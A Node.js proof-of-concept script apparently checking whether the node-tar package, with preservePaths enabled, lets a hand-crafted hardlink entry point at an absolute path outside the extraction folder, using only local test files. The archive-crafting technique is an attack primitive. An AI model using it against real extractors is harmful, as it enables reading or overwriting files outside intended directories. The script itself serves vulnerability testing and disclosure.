
const tar = require('tar');
const fs = require('fs');
const path = require('path');

const extractDir = path.join(__dirname, 'extract');
const outsideFile = path.join(__dirname, 'outside.txt');
const tarFile = path.join(__dirname, 'repro.tar');

function createTarHeader(name, linkname, type) {
    const buf = Buffer.alloc(512);
    buf.write(name, 0); // name
    buf.write('0000644', 100); // mode
    buf.write('0000000', 108); // uid
    buf.write('0000000', 116); // gid
    buf.write('00000000000', 124); // size
    buf.write('00000000000', 136); // mtime
    buf.write(type, 156); // typeflag
    buf.write(linkname, 157); // linkname
    buf.write('ustar', 257); // magic
    buf.write('00', 263); // version

    // checksum
    let cksum = 0;
    for (let i = 0; i < 512; i++) {
        cksum += (i >= 148 && i < 156) ? 32 : buf[i];
    }
    buf.write(cksum.toString(8).padStart(6, '0') + '\0 ', 148);

    return buf;
}

if (fs.existsSync(extractDir)) fs.rmSync(extractDir, { recursive: true });
fs.mkdirSync(extractDir);
if (fs.existsSync(outsideFile)) fs.unlinkSync(outsideFile);
fs.writeFileSync(outsideFile, 'secret content');

// entry.path = 'safe'
// entry.linkpath = outsideFile (absolute)
const header = createTarHeader('safe', outsideFile, '1');
fs.writeFileSync(tarFile, Buffer.concat([header, Buffer.alloc(1024)]));

console.log('Unpacking with preservePaths: true...');
try {
    tar.x({
        file: tarFile,
        cwd: extractDir,
        sync: true,
        preservePaths: true
    });

    const linkedFile = path.join(extractDir, 'safe');
    if (fs.existsSync(linkedFile)) {
        const s1 = fs.statSync(linkedFile);
        const s2 = fs.statSync(outsideFile);
        if (s1.ino === s2.ino) {
            console.log('VULNERABLE: safe is a hardlink to outside.txt');
        } else {
            console.log('Not a hardlink to outside.txt');
        }
    } else {
        console.log('safe was not created.');
    }
} catch (e) {
    console.log('Error during unpack:', e.message);
}
